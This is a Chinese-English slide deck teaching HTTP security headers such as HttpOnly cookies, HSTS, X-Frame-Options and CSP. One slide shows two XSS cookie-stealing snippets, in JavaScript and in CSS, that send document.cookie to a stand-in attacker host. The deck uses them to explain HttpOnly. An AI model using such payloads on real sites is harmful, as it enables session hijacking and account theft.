name: inverse
layout: true
class: center, middle, inverse
---
# HTTP Secure Headers ☢
\---- _by Hatter Jiang_
.footnote[_[HTTP Secure Headers](http://www.openwebsecurity.org/http.secure.headers/)_]
---
layout: false

# About Hatter ☃

_Full Name: <b>Hatter Jiang</b>_

Programmer at Alibaba.com

Mail: _<u>&#104;&#97;&#116;&#116;&#101;&#114;&#64;openwebsecurity.org</u>_

Github: !!!https://github.com/jht5945

Google code: !!!https://code.google.com/p/hatter-source-code/

Favorite languages: 

<font style="font-size:3em;"><em>Java</em></font>
&nbsp; &nbsp;
<font style="font-size:3em;"><em>JavaScript</em></font>
&nbsp; &nbsp;
<font style="font-size:2em;"><em>Go</em></font>
&nbsp; &nbsp;
<font style="font-size:1em;"><em>Rust</em></font>
&nbsp; &nbsp;
<font style="font-size:1em;"><em>Dart</em></font>

.footnote[_Know more about me: !!!http://hatterjiang.com/_]
---
# Agenda

* .big2[Cache-Control]
* .big2[Set-Cookie]
* .big2[Strict-Transport-Security]
* .big2[X-Frame-Options]
* .big2[X-Content-Type-Options]
* .big2[X-XSS-Protection]
* .big2[X-Robots-Tag]
* .big2[Content-Security-Policy]
---
# Cache-Control

.big2[Disable cache]
```
Cache-Control: max-age=0
Cache-Control: no-cache
```

.big2[Keep cache private]
```
Cache-Control: private
```

但是比较悲催的是有些运营商可能会无视缓存设置劫持请求并返回非该用户的响应，在表面上可能会导致用户会话窜了，即A用户可能看到B用户的页面。

.red[.big2[_如果需要彻底解决则需要启用`HTTPS`连接。_]]

.footnote[_Reference: !!!http://tools.ietf.org/html/rfc7234_]
---
# Set-Cookie ☠

.big2[Steal by JavaScript:]
```javascript
new Image().src = "http://ha.cker.club/collectcookie.do?c=" ⏎
                + encodeURIComponent(document.cookie);
```

<br>
.big2[Steal by CSS/JavaScript:]
```css
.getcookies{
    background-image:url('javascript:new Image().src=⏎
                         "http://ha.cker.club/collectcookie.do?c="⏎
                         + encodeURIComponent(document.cookie);');
}
```
```html
<p class="getcookies"></p>
```
.footnote[_Reference: !!!http://jehiah.cz/a/xss-stealing-cookies-101_]
---
# Set-Cookie ☺

* ### HttpOnly
`Cookie`仅在`HTTP(S)`协议中传送，无法通过`document.cookie`获得。
* ### Secure ㊙
`Cookie`仅在`HTTPS`连接中传送，不在`HTTP`连接中传送。

Header from PayPal.com:
```
Set-Cookie: cookie_check=yes; expires=Sun, 14 Aug 2016 14:03:16 GMT GMT;⏎
            domain=.paypal.com; path=/; Secure; HttpOnly
```

.footnote[_Reference: !!!http://tools.ietf.org/html/rfc6265_]
---
# X-Frame-Options ☠

[!Testing for Clickjacking](https://www.owasp.org/index.php/Testing_for_Clickjacking_%28OTG-CLIENT-009%29) (_OWASP_)

![](clickjacking.png)
---
# X-Frame-Options ☺

.big2[禁止所有`frame`]
```
X-Frame-Options: DENY
```
.big2[仅允许同源的`frame`嵌套]
```
X-Frame-Options: SAMEORIGIN
```
.big2[仅允许指定的`frame`嵌套]
```
X-Frame-Options: ALLOW-FROM https://example.com/
```

.footnote[_Reference: !!!http://tools.ietf.org/html/rfc7034_]
---
# Strict-Transport-Security ☠

`HTTP`连接天生是不安全的，特别是在公开(免费)的`Wifi`环境，因为你所用的`Wifi`有可能是黑客搭建的。

通过搭建的`Wifi`，黑客可以(不仅限于)：
* 在路由器指定黑客自己搭建的`DNS`服务器
* 在网络上嗅探并拦截所有`HTTP`请求

如果你不幸中招了，轻则泄露你访问过的那些不堪的网站:'(，重则还可能会有资金损失 5555... 。

.footnote[_Reference: !!!http://tools.ietf.org/html/rfc6797_]
---
# Strict-Transport-Security ☺

Header from Alipay.com:
```
Strict-Transport-Security:max-age=31536000
```
---
# X-Content-Type-Options

```
X-Content-Type-Options: nosniff
```

```
text/css
```

```
application/ecmascript
application/javascript
application/x-javascript
text/ecmascript
text/javascript
text/jscript
text/x-javascript
text/vbs
text/vbscript
```

.footnote[_Reference: !!!http://msdn.microsoft.com/en-us/library/ie/gg622941(v=vs.85).aspx_]
---
# X-XSS-Protection ☠

阻止反射型`XSS`攻击。

反射型`XSS`，是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，客户端代码便能够注入到动态页面中。

![](ie8xssfilter.png)

.footnote[_Reference: !!!http://baike.baidu.com/view/2161269.htm &nbsp; &nbsp; [!REF.2](http://blogs.msdn.com/b/ie/archive/2008/07/02/ie8-security-part-iv-the-xss-filter.aspx)_]
---
# X-XSS-Protection ☺

```
X-XSS-Protection: 1; mode=block
```
---
# X-Robots-Tag ☠

[!微信各种视频泄露](http://wooyun.org/bugs/wooyun-2014-052042) (_乌云_ )
![](weixinleak.jpg)
---
# X-Robots-Tag ☺

```
X-Robots-Tag: robots: none;
```

.footnote[_Reference: [!Robots meta tag and X-Robots-Tag HTTP header specifications](https://developers.google.com/webmasters/control-crawl-index/docs/robots_meta_tag)_]
---
## _Public Key Pinning Extension for HTTP ☄_

.footnote[_Reference: !!!http://tools.ietf.org/html/draft-ietf-websec-key-pinning-20 &nbsp; &nbsp; [!REF.2](http://drops.wooyun.org/tips/1166)_]
---
# Content-Security-Policy ♕

.big2[Browser Support:]
* Chrome 25+
* Firefox 23+
* Safari 7+
* _More from: !!!http://caniuse.com/#search=csp_

.big2[_CSP Level 2 (draft)_]
* `frame-ancestors` replaces `X-Frame-Options`
* `reflected-xss` replaces `X-XSS-Protection`

...
---
name: last-page
template: inverse

# .large[_Thanks!_]

_Learn more from ☞ [!www.OpenWebSecurity.org](http://www.openwebsecurity.org/)_
